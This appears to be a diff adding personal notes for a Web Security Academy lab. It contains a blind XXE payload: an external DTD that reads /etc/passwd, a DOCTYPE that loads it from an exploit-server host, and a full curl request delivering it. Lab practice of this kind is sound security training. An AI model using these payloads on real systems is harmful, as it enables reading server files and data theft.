@@ -1,0 +1,21 @@
+
+
+exploit-server:
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+
+https://exploit-0a18004b047587d28036cfa701ce00a3.exploit-server.net/exploit
+
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a18004b047587d28036cfa701ce00a3.exploit-server.net/exploit"> %xxe;]>
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a730088044e8735804ad002000500b2.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0a730088044e8735804ad002000500b2.web-security-academy.net/product?productId=1' -H $'Content-Type: application/xml' -H $'Content-Length: 230' -H $'Origin: https://0a730088044e8735804ad002000500b2.web-security-academy.net' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=O8j2VYJsTo3bEmCC1aNb4CccJ0zTeWLw' \
+    --data-binary $'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"https://exploit-0a18004b047587d28036cfa701ce00a3.exploit-server.net/exploit\"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>' \
+    $'https://0a730088044e8735804ad002000500b2.web-security-academy.net/product/stock'
